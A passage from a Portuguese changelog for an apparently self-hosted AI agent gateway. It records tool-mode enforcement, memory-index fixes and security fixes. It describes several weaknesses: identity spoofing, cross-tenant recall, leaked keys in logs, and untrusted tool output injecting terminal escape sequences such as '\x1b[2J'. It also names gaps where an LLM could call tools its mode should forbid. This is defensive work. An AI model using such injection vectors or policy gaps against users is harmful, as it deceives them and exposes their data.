  valendo, `/mode auto` para quem escreve em portugues virava **nenhuma
  restricao**, em silencio, justamente para o publico principal do projeto. O
  vocabulario veio do `AutoRouter` morto de `agent_mode.rs`; o algoritmo dele
  nao veio — era primeiro-que-casar-vence e devolvia sempre um modo, nunca
  `None`, e classificar "oi" como `code` sob politica aplicada seria pior que
  nao classificar.
- **Os limites do modo alimentam o orcamento de execucao (#979).**
  `ModeLimits` existia desde o desenho dos modos e o runtime nunca o leu: todo
  turno rodava com o padrao fixo, entao um modo que se declarava mais curto nao
  era mais curto em lugar nenhum. `max_tool_loops` e `timeout_secs` passam a
  valer. Precedencia: override explicito de `max_tool_calls` > limites do modo >
  padrao.
- **O modo baixa o teto de execucao, nunca levanta.** Achado de auditoria: dos
  nove perfis, um so pede mais que o padrao — o `orchestrator`, com 100 chamadas
  e 60s de timeout, que levaria o pior caso de um turno de ~25 para ~100
  minutos. Modo e um seletor do usuario (`/mode` e comando, e o
  `POST /api/mode/select` e aberto), entao deixa-lo levantar o teto faria o
  custo de API e o tempo de parede dependerem do que a pessoa digitou, sem o
  operador ter dito nada. O padrao — que o operador ja configura — vira o limite
  superior, e o modo so encurta a partir dali. Quem quer mais passa
  `max_tool_calls` explicito, que e knob de quem sobe o processo.
- **A lacuna do MCP passa a ser dita em voz alta.** Um modo whitelist
  (`search`, `review`, `architect`, `debug`, `edit`) lista so nomes nativos, e
  ferramenta de servidor MCP passa por ele — continua sujeita ao `denied`, mas
  nao a whitelist. Isso ja era assim; o que mudou e **quem encontra**, porque
  `/mode auto` deixou de ser inerte. Quem digitou `auto` e escreveu uma pergunta
  de busca agora acredita estar somente-leitura enquanto uma ferramenta MCP de
  escrita continua disponivel, e acreditar numa restricao que nao existe e pior
  que nao ter restricao. Fechar a lacuna derrubaria toda integracao MCP nesses
  cinco modos, em silencio, entao por ora o runtime emite `warn!` nomeando as
  ferramentas MCP que passaram — para o operador que conectou o servidor, nao
  para o modelo. Um whitelist que entenda servidor MCP precisa ser desenhado.
- **`/stats` passa a dizer o que a ultima resposta usou de verdade (#984).**
  Mostrava tres contadores globais — sessoes ativas, overrides de modelo, tarefas
  A2A — e nada sobre o LLM. Agora mostra provider, modelo, ferramentas
  executadas, tokens, latencia e se um fallback respondeu.
- **Efetivo, e nao configurado.** A issue faz a distincao certa: o runtime
  resolve override, prefixo de modelo, `tools_model` e fallback pelo caminho,
  entao perguntar a config e perguntar a quem nao sabe. O runtime passa a
  registrar, no fim de cada turno, o que de fato aconteceu — e o modelo vem da
  **resposta do provider**, o unico valor que sobreviveu a todas as resolucoes.
- **O que nao da para saber aparece como nao sabido.** No streaming nao ha
  `LlmResponse`: so deltas de texto. Ali o modelo conhecido e o *pedido* e nao ha
  contagem de tokens, entao o `/stats` marca os dois em vez de mostrar o pedido
  como se fosse o efetivo. Zero-porque-nao-sei e diferente de
  zero-porque-nao-usou.
- **Modo aplicado, e nao apenas o salvo.** O #988 separou escolha de deducao, e
  so a escolha liga a `ToolPolicy`. O `/stats` diz qual dos dois esta em vigor —
  mostrar so o modo salvo faria o usuario acreditar numa restricao que nao vale.
  Mostra o objetivo da sessao (#983) junto.
- O registro por sessao tem teto de 512 entradas com despejo do mais antigo: a
  chave e o `session_id`, que vem de request, e sem teto o mapa cresceria com o
  numero de sessoes que ja passaram. Batimento agendado (`process_heartbeat`)
  **nao** grava — sobrescrever o `/stats` com um turno que o usuario nao pediu
  seria pior que nao ter o dado.
- Os dois `unwrap()` do closure do `/stats` sairam (regra absoluta 4). Os outros
  24 de `commands.rs` continuam la, fora do escopo deste trabalho.

### Removed

- **`garraia_agents::agent_mode` removido (496 linhas).** `AutoRouter`,
  `ToolPolicyEngine`, `LlmRouter`, `ModeProfileExt`, `ModeSelectionMethod` e
  `SessionModeMetadata` estavam todos re-exportados em `lib.rs` e nenhum tinha
  consumidor fora do proprio arquivo. A #979 pedia para conectar o
  `AutoRouter`/`ToolPolicyEngine` daqui ao runtime; era o par inferior. O
  roteador vivo — com pontuacao, folga minima e estagio de LLM — mudou de
  `garraia-gateway` para `garraia-agents`, que e onde o runtime alcanca (a CLI
  monta o proprio `AgentRuntime` e nao passa pelo gateway).
- **Duas das quatro camadas do sistema de modos eram inalcancaveis, e sairam
  (#985, #987).** O `garraia-runtime/src/mode.rs` tinha ~910 linhas com
  `AgentMode`, `ModeProfile`, `ToolPolicy` e `ModeEngine` proprios e **nunca
  foi instanciado**: o unico consumidor do crate e o gateway, que importa so o
  `RuntimeSettings`. Os ~250 usos de `ModeEngine::new()` que o arquivo tinha
  eram testes dele mesmo. O `/mode` e o `/modes` de
  `garraia-channels/src/commands/builtins/` idem: `register_builtins` nao e
  chamado em lugar nenhum, e o registry que atende o usuario nasce vazio e e
  preenchido so pelo `register_commands` do gateway.
- **A #985 descrevia o risco errado, e o certo e menor.** Ela falava em
  "validar um modo que o runtime nao aplica" — isso nao acontecia, porque
  codigo inalcancavel nao executa nada. O custo real era manutencao dupla e
  leitura enganosa: o `ToolPolicy` morto tinha `read_only` e o vivo nao, e a
  #988 chegou a propor "honrar `read_only`" com base na copia morta. A #987
  falava em "comportamento divergente em canais que usam a camada generica" —
  nao existe tal canal.
- **Fica registrado qual e o canonico**, no lugar onde alguem vai procurar:
  `garraia_agents::modes` e o que o `/mode`, o `POST /api/mode/select` e o
  `GET /api/modes` usam; e o roteamento automatico em producao e o
  `garraia_gateway::auto_router`, nao o `AutoRouter` de
  `garraia_agents::agent_mode`, que tambem nao tem chamadores.
- Os outros doze comandos de `builtins/` continuam no mesmo estado de
  inalcancavel. Nao os apaguei: liga-los ou remove-los e decisao de quem os
  escreveu. Mas o docblock do modulo agora diz que nao estao ligados, para nao
  enganar um terceiro leitor — ja enganou dois.

### Fixed

- **Limpeza do indice vetorial: janela de corrida fechada e delecao atomica
  (divida da auditoria do #971).** `compact` e `delete_session_memory`
  coletavam os ids condenados e deletavam sob guards diferentes do mutex: uma
  insercao concorrente que casasse a condicao era apagada sem entrar na lista
  de limpeza, deixando vetor orfao no indice. Os dois passos passam a dividir
  um guard so. `VectorStore::delete_embeddings` ganhou transacao — as N
  tabelas `vec_embeddings_*` e o `vec_id_map` mudam juntos ou nao mudam; sem
  ela, falhar no meio deixava vetor sem mapeamento, invisivel ate para o
  `integrity_report`. `insert_embedding` tambem virou transacional: um vetor
  recusado pelo vec0 por dimensao divergente (#961) deixava o mapeamento ja
  gravado para tras, criando orfao instantaneo.
- **Recall filtra por `embedding_model` (#954).** Cosseno entre espacos
  vetoriais de modelos diferentes nao significa nada, mesmo com a mesma
  dimensao. `RecallQuery` ganha `embedding_model` (o runtime envia o modelo
  ativo junto do vetor de consulta); o fetch KNN filtra por ele e o
  `score_and_rank` zera o eixo semantico de entradas de outro modelo — elas
  seguem competindo por texto/recencia. Quando o KNN acha vizinhos mas nenhum
  pertence ao modelo ativo, um warn nomeia a causa provavel (troca de modelo
  sem reindexar) — antes o operador nao tinha sinal nenhum.
- **Deletar memoria deixa de criar vetores orfaos (#960).**
  `delete_session_memory` e `compact` apagavam as linhas mas nunca o indice:
  vetor e mapeamento ficavam para sempre. Agora a delecao varre TODAS as
  tabelas `vec_embeddings_*` (inclusive dimensoes antigas, #954) e o
  `vec_id_map` — com filtro que exclui as shadow tables internas do vec0
  (`_info`/`_chunks`/`_rowids`), que um LIKE ingenuo pegaria junto.
- **Embeddings ganham timeout proprio, retry e validacao de dimensao
  (#962, #961).** O bootstrap reusava o timeout do LLM — 120s para uma chamada
  que responde em milissegundos, entao um Ollama travado segurava o turno
  inteiro do agente, que espera o `query_embedding` para montar o recall.
  Agora ha `timeouts.embeddings` proprio (default 30s) e um envelope
  `ResilientEmbeddingProvider` em volta dos tres providers: repete falha
  transitoria com backoff (transporte, 429, 5xx) e nunca repete o que nao
  melhora repetindo (4xx, corpo que nao decodifica). O mesmo envelope valida
  a dimensao devolvida contra `embeddings.<nome>.dimensions` — campo que era
  parseado e nunca consumido por ninguem — e **recusa** o vetor divergente em
  vez de grava-lo: cada dimensao cria uma tabela `vec_embeddings_N` propria, e
  um modelo trocado sem atualizar a config fazia o recall procurar na tabela
  errada, perdendo em silencio tudo o que ja estava indexado.
- **A memoria para de perder embedding em silencio (#948).** `embed_document`
  e `embed_query` engoliam o erro com `.ok()`: a entrada era gravada sem
  vetor, ficava invisivel para a busca semantica para sempre, e nada no log
  dizia que tinha acontecido. Agora cada falha vira `warn!` nomeando provider,
  modelo e consequencia. E `embedding_model` deixa de ser gravado quando nao
  ha vetor — a coluna descreve o vetor, entao preenche-la sem vetor fazia a
  linha mentir, e com o filtro de modelo do #954 ativo essa mentira ainda
  custava o eixo semantico da entrada.
- **O ramo openai do bootstrap para de inventar a chave (#948).** Ele usava o
  literal `"no-key"` para qualquer endpoint e nem procurava a credencial no
  ambiente ou no cofre, so no arquivo de config. Contra a OpenAI oficial isso
  e 401 em toda chamada de embedding — silencioso, porque o erro era engolido
  logo adiante. Agora a chave passa pelo mesmo `resolve_api_key` dos demais
  providers, endpoint proprio (LM Studio, vLLM, gateway interno) segue sem
  credencial e sem mandar `Authorization` vazio, e endpoint oficial sem chave
  e pulado com aviso em vez de subir quebrado.
- **Os docs de memoria contradiziam o binario, em dois arquivos.**
  `docs/src/memory.md` afirmava "**Nao ha `garra memory add`**" — falso desde
  que o comando entrou (#958). E `docs/memory.md`, para onde **o wiki do
  projeto aponta duas vezes** como "Sistema de memoria", ainda descrevia o
  sistema que nunca foi construido: um `facts.json` com array de fatos
  datados, as chaves `auto_extract` e `max_facts`, e os comandos
  `garraia memory clear`, `export` e `disable`. A reescrita do #963 conferiu
  cada afirmacao contra o codigo, mas conferiu a pagina do book; esta copia
  ficou para tras e seguiu sendo servida a quem chegava pelo wiki.
- `docs/memory.md` vira redirecionamento para a pagina viva — apaga-lo
  quebraria os links do wiki. `docs/src/memory.md` ganha a secao do
  `garra memory add`, com o que importa: o embedding e gerado **na hora**,
  porque uma entrada sem vetor nao aparece na busca semantica e um comando de
  semear que deixasse a entrada invisivel ate um segundo comando seria uma
  armadilha.
- **O turno que caiu no fallback nao-streaming nao era anotado.** O `/stats`
  (#984) e o `/status` novo respondiam "nenhum turno ainda" **depois de um
  turno inteiro**, sempre que o provider nao fazia streaming — Ollama antigo,
  llama.cpp sem SSE, ou qualquer provider num momento em que o streaming
  falha. Dos tres `return Ok` do `stream_turn_with_sink`, so um anotava.
  Achado rodando o binario: `Turnos 1` e `Ultimo turno: nenhum ainda` na mesma
  tela.
- **E o ramo do fallback agora anota melhor que o de streaming.** La ha uma
  `LlmResponse` de verdade, entao o modelo vem **confirmado pelo provider** e a
  contagem de tokens existe — o caminho de streaming so conhece o modelo
  *pedido*. O turno que pede confirmacao de ferramenta tambem passou a contar:
  um `/stats` em branco depois de uma pergunta diria que nada aconteceu.
- **A descricao de ferramenta MCP passa por redacao de segredo.** Ela e texto
  livre escrito pelo servidor, e o `/tools` a mostra. O painel ja tirava
  escape, mas escape nao e o unico problema: uma descricao mal escrita pode
  trazer uma URL com token, e ela iria para a tela em texto plano. E a mesma
  redacao que a **saida** da ferramenta ja recebia.
- **Turno curto ou puramente social deixa de poluir a busca semantica (#952).**
  `"oi"`, `"ok"`, `"kkkk"` e `"bom dia"` eram embeddados como qualquer outra
  mensagem e disputavam o top-K com memoria de verdade — texto curto tem
  cosseno alto com quase tudo. Numa base de ~7.100 entradas, "quem e Michel"
  trazia entradas `"oi"` entre os primeiros resultados. Agora a ingestao
  decide se vale gastar um vetor: a entrada **continua gravada** e achavel
  pelo recall textual, so nao entra no indice vetorial. A regra de frase so
  casa com o conteudo **inteiro** (`"obrigado"` e ruido, `"obrigado pela
  ajuda com o deploy"` nao), e nada e apagado nem retroativo — vetor de ruido
  ja indexado continua onde esta. Configuravel em `memory.ingestion`
  (`filter_noise`, `min_chars`, `extra_noise_phrases`), validado pelo
  `garra config check`, documentado em `docs/src/memory-ingestion.md`.
  `garra memory reindex` usa a **mesma** politica — com politicas divergentes
  ele reembeddaria uma por uma as entradas que a ingestao acabou de pular — e
  passa a separar no relatorio o que seria reindexado do que fica sem vetor
  de proposito, para que o total de "sem vetor" do `stats` pare de parecer
  defeito.
- **A compactacao da memoria passa a rodar sozinha — ate aqui nunca rodou (#956).**
  O `MemoryStore::compact()` existia desde sempre e os unicos chamadores eram os
  testes e, desde o #950, a CLI. Na pratica a memoria de longo prazo crescia sem
  teto: ruido acumulava, o recall degradava (mais candidatos no KNN, mais lixo
  entre eles) e o backup ficava maior a cada dia. Agora o gateway sobe uma
  varredura periodica (`memory.retention`) que apaga entradas nao-fixadas mais
  velhas que a janela configurada. **Nasce desligada de proposito:** liga-la por
  default numa atualizacao apagaria memoria de quem so quis atualizar a versao.
  Enquanto esta desligada o boot avisa uma vez que a memoria cresce sem teto e
  como ligar — o operador ganha o sinal sem pagar com dado.
- **O stub do retriever de skills parava de mentir (#964).** A doc dizia
  "Returns empty list until then" e o corpo devolvia `Err` — duas frases sobre a
  mesma funcao, discordando. Quem lesse o comentario escreveria
  `retrieve(q)?.is_empty()` e levaria um erro em producao. O comportamento que
  ficou e o `Err`, porque `Ok(vec![])` seria pior: lista vazia e indistinguivel
  de "procurei e nao achei nada", e o chamador seguiria em frente com um recall
  que nunca rodou. A doc tambem citava a dependencia errada (`garraia-embeddings`,
  o crate orfao do #949) e agora aponta o par que de fato funciona na memoria do
  agente. Nao ha chamador no workspace hoje.
- **Acento derrubava o turno no roteador por LLM.** O corte da mensagem para a
  chamada de classificacao era `&text[..text.len().min(400)]`, e `len()` conta
  **bytes**: numa mensagem em portugues com mais de 400 bytes, o corte cai no
  meio de um `c`-cedilha ou de um `a`-til e o slice entra em panico. Passa a
  cortar por caractere. Caminho alcancavel sempre que
  `agent.auto_router_llm_enabled` estiver ligado e a heuristica ficar em duvida.
- **O modo escolhido passa a valer de verdade (#982, #988).** Ate aqui `/mode
  code` respondia "modo definido", gravava no banco, e a proxima mensagem rodava
  igual — o modo era salvo e nunca lido no caminho de execucao, e a
  `ToolPolicy` de cada modo era declarada e nunca verificada. Modos anunciados
  como somente-leitura (`search`, `review`, `architect`) nao bloqueavam
  `file_write` nem `bash`: apenas pediam no prompt. Agora o modo chega ao
  runtime pelos dez pontos que atendem usuario, e a politica e aplicada.
- **Aplicada em dois niveis, de proposito.** O filtro na montagem tira a
  ferramenta da lista que o modelo ve — e UX, o modelo nao gasta turno pedindo
  o que nao pode. O guard antes de cada `tool.execute` e a garantia: o criterio
  de aceite e "nenhuma ferramenta proibida e executada, **mesmo que solicitada
  pelo LLM**", e o modelo pode pedir um nome que nunca esteve na lista.
- **"Sem modo escolhido" nao e "modo Ask", e essa distincao evita a regressao
  mais provavel do lote.** O default do enum e `Ask`, e `ask` nega
  `file_write`. Se sessao sem modo resolvesse para `Ask`, ligar a politica
  quebraria escrita por padrao em **todo** canal, CLI incluso — que nunca seta
  modo. O criterio de aceite pede que o comportamento padrao nao regrida, e o
  comportamento padrao de hoje e nao ter politica.
- **Ferramenta MCP nao e barrada por whitelist, e isso e um limite conhecido.**
  Tool de servidor MCP se chama `{servidor}__{tool}`, e os whitelists de cinco
  dos nove modos listam so nomes nativos — aplicar ao pe da letra derrubaria
  toda integracao MCP nesses modos, em silencio. Ela passa pelo whitelist e
  continua sujeita ao `denied`. **A consequencia:** um modo somente-leitura nao
  restringe ferramenta MCP. Se o operador conectou um servidor que escreve
  arquivo, o modo `search` nao o impede. Um whitelist que entenda servidor MCP
  precisa ser desenhado, e nao cabia aqui.
- **O `working_dir` chega as ferramentas de arquivo (#980).** Caminho relativo
  passa a resolver contra o diretorio do projeto em vez do cwd do processo.
  **Isto nao e um sandbox**, ao contrario do que a issue afirma: o
  `resolve_tool_path` rejeita `..` e junta relativo com o diretorio, mas nao
  canonicaliza nem confina — caminho absoluto passa igual, antes e depois. E o
  `bash_tool` ignora o campo por completo. O que a issue chama de validacao ja
  testada (`is_path_allowed`, `ProjectToolContext`) e codigo morto, alcancado
  so pelos proprios testes.
- **Deduzir nao e consentir.** O auto-router (GAR-227) classifica a mensagem e
  grava o modo na sessao. Enquanto o modo era decoracao de prompt isso era
  inofensivo; com a politica valendo no executor, ler dali aplicaria restricao
  a quem nunca escolheu nada — bastava a heuristica achar que a pergunta
  parecia busca para `file_write` sumir. O store passa a registrar **quem**
  escolheu (`agent_mode_source`): o `/mode` e o `GET /api/mode/current`
  continuam mostrando o modo deduzido, e so o escolhido liga a politica. Sessao
  gravada antes do marcador conta como nao-escolhida — e o comportamento que
  ela ja tinha, e o primeiro `/mode` regulariza.
- **O `X-Agent-Mode` nunca chegava ao banco.** O gateway gravava o modo antes
  de `hydrate_session_history` criar a linha da sessao, e `set_agent_mode` e um
  `UPDATE ... WHERE id = ?`: zero linhas casadas, `Ok(())` devolvido, `let _ =`
  no chamador. O header dizia `search` e o banco ficava vazio — bug anterior a
  este lote, achado rodando o binario, invisivel a qualquer teste que so
  chamasse o setter numa sessao existente. Agora a gravacao acontece depois da
  hidratacao, o setter devolve erro quando nao encontra a sessao, e o `/mode` do
  Telegram avisa em vez de responder "modo definido" com o banco intacto.
- **O upsert da sessao apagava o modo a cada requisicao.** Causa-raiz mais
  profunda que a anterior, e a razao real de o `/mode` nunca ter funcionado:
  `upsert_session_with_tenant` fazia `metadata = excluded.metadata` —
  substituicao inteira — e os dois chamadores de producao
  (`hydrate_session_history` no inicio do turno, `persist_turn` no fim) passam
  `{}` ou so `{"continuity_key": ...}`. O `/mode search` respondia "modo
  definido", gravava, e o proprio turno apagava. Enquanto o modo era decoracao
  de prompt isso so tornava o comando inutil; com a `ToolPolicy` valendo,
  passou a ser uma restricao que o produto promete e nao entrega. O upsert
  passa a **mesclar** (`json_patch`, RFC 7396: chave presente sobrescreve,
  ausente preserva, `null` apaga), com guarda para linha de metadado nula ou
  quebrada — `json_patch(NULL, ...)` devolveria `NULL` e trocaria a
  substituicao por um apagamento pior.
- **Nome de modo invalido para de virar escolha.** O `/mode` e o
  `PUT /api/mode` ja recusavam nome desconhecido com mensagem; o header
  `X-Agent-Mode` e o prefixo `mode:` gravavam a string crua. Depois da politica
  isso era uma escolha registrada que nao resolve para perfil nenhum: portao
  aberto, `/mode` exibindo um modo inexistente, ninguem sabendo. Agora valida,
  loga `warn!` e segue como "nao pediu modo" — o request nao cai por causa de
  um typo em header. O valor logado passa por um limitador: nome de modo real e
  uma palavra curta em ASCII, e o engano que preocupa e colar um segredo no
  lugar do nome, entao o campo sai com 24 caracteres, sem controle e marcado
  quando ha corte.
- **Slack, Discord, WhatsApp, iMessage e o terceiro braco do `POST /api/chat`
  entram junto.** Eles chamavam os wrappers `_with_context`, que passam
  `ExecContext::default()`: `/mode search` respondia "modo definido" e a
  restricao valia so no Telegram. Assimetria silenciosa e pior que ausencia,
  porque o usuario acredita na restricao. Um teste varre o fonte para o proximo
  canal — que sera escrito copiando um destes — nao reintroduzir o buraco.
  `a2a.rs` fica de fora com o motivo escrito: a sessao `a2a:{task_id}` nasce e
  morre na requisicao, entao nao ha escolha para ler.
- Um `ExecContext` no lugar de mais dois `Option<&str>`: o metodo ja tinha dez
  parametros e dois `#[allow(clippy::too_many_arguments)]`, e a #986 traria
  mais um.
- **`/mode` e `/model` no Telegram gravavam numa sessao que a execucao nunca
  lia.** O GAR-202 migrou a chave de sessao de `telegram-{chat_id}` —
  adivinhavel — para um UUID do `ChatSessionManager`, mas a migracao pegou so o
  caminho de execucao. A camada de comandos continuou montando a string antiga,
  em tres lugares. O efeito era um recurso que parecia funcionar: `/mode code`
  respondia "modo definido", gravava no banco, e a proxima mensagem rodava sem
  ele; `/mode` sozinho lia da chave errada e mostrava "modo atual: ask" logo
  depois. So nao aparecia quando o `chat_session_manager` era `None`, que e o
  caminho de fallback.
- **A correcao e ter um lugar so.** `AppState::telegram_session_id` passa a ser
  a unica funcao que monta a chave, e os cinco pontos — tres de comando, dois de
  execucao — chamam ela. Duplicar a resolucao foi o que permitiu a divergencia.
- **Um teste varre o fonte** procurando `format!("telegram-{` fora do
  `state.rs`. E o unico jeito de pegar a proxima copia antes de ela divergir:
  um teste de comportamento so falharia depois de alguem reintroduzir o bug e
  alguem mais notar.
- O `user_id` continua sendo passado onde existe. Ele nao muda **qual** sessao
  e encontrada (a busca e por `chat_id`), mas define o dono no `upsert` de
  criacao — sem ele, um `/mode` antes da primeira mensagem criaria a sessao com
  dono `"anonymous"`.

- **O aviso de secret de auth ausente passa a ser acionavel (#925).** Ele dizia
  o que estava errado sem dizer se importava. Num gateway local single-user nao
  importa: console web, `/ws`, `/v1/chat/completions`, `mcp-server`, CLI e
  canais nao passam por `/auth/*`. Ja `/chat` (mobile, via `MobileAuth`, que
  resolve o secret por `AppState::jwt_signing_secret`), o TOTP e o workspace
  multi-tenant caem junto. A mensagem agora diz as duas coisas.

  Diz tambem o que **nao** e verdade: setar so `GARRAIA_JWT_SECRET` destrava
  nada, porque `AuthConfig::from_env` e all-or-nothing sobre quatro variaveis e
  o secret so e ligado depois que os dois pools Postgres passam no guard de
  role. Uma primeira versao desta mensagem prometia o contrario e teria mandado
  o operador para um beco sem saida; um teste agora fixa a honestidade.

  `/api/diagnostics` ja sugeria uma correcao para a mesma condicao, em outras
  palavras e sem o comando; as duas superficies passam a dizer a mesma coisa.
  Nenhum campo novo em `Finding` — o texto e anexado a `message`, e o prefixo
  `"none of GARRAIA_JWT_SECRET"` e preservado porque ha teste sobre ele.
- **`docs/auth-config.md` ganha a secao "Minimal local auth" (#925)** com as
  duas tabelas (o que fica de pe, o que cai) e a nota sobre a passphrase do
  cofre ser tambem o ultimo fallback do JWT — entao quem rodou o `garraia init`
  e escolheu o cofre pode ja ter um secret sem saber. `docs/index.md` nao
  linkava esse documento de lugar nenhum; passa a linkar.
- **`file_read`/`file_write` resolvem caminhos como o usuario espera (#923).**
  Nao era sandbox (producao roda com `allowed_directories: None`): nao havia
  expansao de `~`/`$HOME` em lugar nenhum, o `working_dir` da sessao era
  ignorado e o erro nao nomeava o caminho tentado — foi assim que o agente
  disse ao usuario que um arquivo existente "nao existia". Novos resolvers
  puros (`expand_home` + `resolve_tool_path`, com `PathOrigin` dizendo qual
  regra decidiu), e o erro agora carrega o caminho resolvido + o pedido +
  a dica. `..` continua rejeitado no input cru, antes de qualquer expansao.
- **Tools MCP nao congelam mais no snapshot do boot (#924).** A lista de
  tools do `AgentRuntime` era escrita uma vez no boot e congelava num `Arc`:
  servidor que conectasse depois (reconexao do health monitor, admin API)
  aparecia `connected` com N tools e o LLM nao conseguia chamar nenhuma —
  `garraia mcp call` funcionava, o que disfarcava o bug de capacidade como
  bug de contador. Agora `tools: RwLock<Vec<RegisteredTool>>` com
  `ToolSource` (`native` vs `mcp{server}`), sync a cada tick do health
  monitor, e `GET /api/mcp/tools` expoe o breakdown +
  `runtime_in_sync_with_manager` no `/api/mcp/health` para isso ser
  checavel de fora.
- **Continuidade de conversa no WS e no REST mobile (#922).** Dois bugs: o
  handler REST passava `&[]` como historico sob um comentario falso ("history
  already hydrated into runtime session" — o runtime nao guarda historico), e
  o `/ws` so retomava sessao durável com token *presente*, nao *verificado*
  (`token_verified` ≠ `token_ok`). O webchat passa a persistir e reenviar o
  `session_token`. Teste-guarda varre o fonte do handler para o `&[]` nao
  voltar.
- **`gateway.session_tokens_required: true` recusa o boot em vez de mentir
  (#945, achado de verificacao — sem issue).** `require_session_auth` era
  codigo morto (nunca ia a `.layer()`), entao o flag era no-op para HTTP —
  e tres documentos, incluindo o guia de hardening e o
  `config.hardened.example.yml` oficial, afirmavam o contrario. Quem seguiu
  o guia acreditava estar protegido e nao estava. Agora o boot falha alto
  nomeando a saida em uma linha, `config check` reporta Error, e os seis
  lugares que mentiam foram corrigidos (`gateway.api_key` protege so o
  `/ws`; docs dizem exatamente isso).
- **Telegram reconecta no boot em vez de emudecer para sempre (#946/#928).**
  `TelegramChannel::connect()` nao tinha retry: 5s de rede movel ruim na
  hora errada custavam o canal ate restart manual — enquanto o *polling* do
  teloxide ja reconectava para sempre (1s→64s). Falha de boot agora vira
  retry em background (exponencial 2s→cap 60s, a forma do OpenClaw), sem
  teto de tentativas de proposito, registrando o canal quando conectar.
  O resto do relato da #928 (strings de log do CPython, unit systemd
  `portao-despachante`) nao e deste repositorio — detalhe no PR e na issue.
- **Ancora #115 do ledger CodeQL reapontada (#932).** O shift de +54 linhas
  do #921 em `session_store.rs` moveu a linha ancorada; o fix reaponta linha
  e referencias internas sem tocar o `sink_snippet` (que o script proibe
  editar para "passar").

### Security

- **O caminho KNN do recall passa a respeitar tenant, sessao e continuidade
  (achado da verificacao da Trilha C — sem issue).** O indice sqlite-vec so
  conhece distancia; o fetch dos candidatos (`fetch_entries_by_ids`) fazia
  `WHERE id IN (...)` sem NENHUM dos filtros da query, enquanto o caminho SQL
  sempre filtrou. Com o vec ativo, um recall com `tenant_id` definido podia
  devolver memorias de outro tenant. O fetch agora reescopa os quatro filtros
  (tenant, sessao, continuidade e modelo) e ha teste garantindo que linha de
  outro tenant nunca volta pelo KNN.
- **Corpo de erro de provider de embeddings deixa de poder ir cru para o log
  (achado da auditoria deste lote).** Enquanto o runtime engolia esses erros
  com `.ok()`, o corpo da resposta HTTP nunca chegava a lugar nenhum; a
  correcao do #948 passou a loga-los, e corpo de erro nao e conteudo
  confiavel — a OpenAI ecoa de volta a chave que voce mandou quando ela esta
  errada, e um endpoint self-hosted pode devolver o request inteiro. Agora os
  tres providers sanitizam na origem: 401 e 403 perdem o corpo por completo
  (o status, que e o que o operador precisa, fica), e os demais sao truncados
  e tem tokens de formato conhecido raspados. Teste ponta a ponta contra um
  servidor que devolve 401 com a chave no corpo garante que ela nao aparece na
  mensagem de erro.
- **`/v1/chat/completions` para de derivar identidade do que o chamador
  escreve (#1012).** A rota e auth-free por desenho, como todo o `/api/*` — mas
  auth-free significa "nao exige credencial", e nao "aceita a identidade que o
  chamador afirmar". Ela aceitava as duas coisas que vem do proprio chamador:
  um `Authorization: Bearer` qualquer virava o `user_id` (o comentario no fonte
  dizia *"this allows custom API keys to identify users"*, o que nunca foi
  verdade — a rota nao verifica o token contra nada, entao equivalia a deixar
  o chamador escolher o proprio nome), e na ausencia dele o header `X-User-Id`
  era usado cru.
- **Severidade: latente, nao ativa.** Rastreado ate o fim, o `user_id` nao abria
  leitura de dado alheio — a carga de historico e chaveada por `session_id`. O
  impacto era **atribuicao falsa**: a sessao e o registro no banco ficavam sob
  uma identidade que ninguem provou. Vale fechar porque e a mesma forma do
  buraco que a #1010 fechou de proposito *antes* de ligar execucao nele.
- **Agora a identidade e a do dono da instalacao local, ou `None`.** `None` e a
  resposta honesta para instalacao sem dono: preenche-la com o header seria
  inventar um dono. O `garra-local` continua resolvendo o dono, com teste de
  nao-regressao. Um bearer que nao seja `garra-local` e ignorado, com apenas o
  fingerprint no log — nunca o token. E o **valor do dono tambem nao vai para o
  log**: a primeira versao desta correcao o logava em toda requisicao, o que
  era pior que o codigo vulneravel (que so o logava quando um `garra-local`
  era apresentado). No WhatsApp o dono e o proprio numero de telefone.
- **`AppState::continuity_key` perdeu o parametro que nunca usava.** Ele
  recebia `_user_id`, e dos quatorze chamadores **sete** passavam um id por
  pessoa literal (Telegram x2, Slack, WhatsApp, Discord, iMessage, e a
  `task.user_id` do A2A) — todos recebendo a mesma `bus:shared-global` de
  volta. O `_` era a unica coisa separando o leitor da conclusao errada de que
  a chave era escopada por pessoa. O parametro foi **removido** em vez de
  passar a ser honrado: honra-lo mudaria o significado de
  `memory.shared_continuity` para quem ja o ligou, e "shared" e o que a opcao
  promete. O barramento e global por desenho, e agora a assinatura diz isso.
- Postura da rota documentada em `docs/security/threat-model.md` §5.9.
- **`GET /api/modes/custom/{id}` deixa de ler o modo de qualquer usuario.** A
  consulta filtrava so por `id`, e a tabela tem `user_id` — entao o endpoint
  devolvia o `prompt_override` de outra pessoa. Hoje o buraco e inerte, porque
  todo modo e gravado sob a mesma identidade e o `/api/*` e auth-free por
  desenho (local-first, mono-usuario); mas o #986 faz a **execucao** passar a
  depender da resolucao de modo customizado, e ligar isso a uma busca sem escopo
  transformaria um buraco inerte em caminho ativo. O handler passa a usar
  `get_custom_mode_for_user`, a resolucao de execucao procura por nome dentro de
  `get_custom_modes(user_id)`, e o `user_id` fixo deixa de ser uma string
  repetida em quatro lugares para virar uma constante nomeada — de modo que quem
  trocar por identidade real troque num lugar so. Teste cross-user confirma que
  nem o `GET` por id, nem a listagem, nem o `select` alcancam o modo alheio.
- **`PATCH` e `DELETE /api/modes/custom/{id}` tambem passam a respeitar o dono.**
  A primeira versao deste trabalho deu escopo so ao `GET`, usando para a leitura
  um argumento que vale **mais** para a escrita: sobrescrever ou apagar o modo de
  outra pessoa e pior que le-lo. O escopo entra na clausula `WHERE` das duas
  consultas, e nao num filtro depois — um `UPDATE` que casa a linha alheia ja
  escreveu quando o filtro rodaria. Como o resto, hoje e inerte e existe para o
  dia em que houver identidade de verdade.
- O `format!` que monta a lista de colunas do `UPDATE` ganhou o comentario de
  auditoria que a regra absoluta 5 exige na sua propria excecao: os fragmentos
  sao literais Rust escritos no bloco, nenhum vem de request, e todo valor
  continua indo por `?`. Sem o comentario, a proxima pessoa a acrescentar coluna
  ali nao tem o sinal de alerta.
- **Saida de ferramenta nao injeta mais comando no terminal (#995).** O resumo
  do #937 redigia segredo e trocava quebra de linha por espaco, mas deixava
  passar `ESC` e os demais controles — e saida de ferramenta nao e conteudo
  confiavel: e o que o agente leu de um arquivo, baixou de uma pagina ou o que
  um comando escreveu. Um `README` de repositorio clonado conseguia limpar a
  tela de quem roda o `garra chat` com `\x1b[2J`, trocar o titulo da janela com
  OSC, ou reposicionar o cursor para sobrescrever linhas ja impressas, forjando
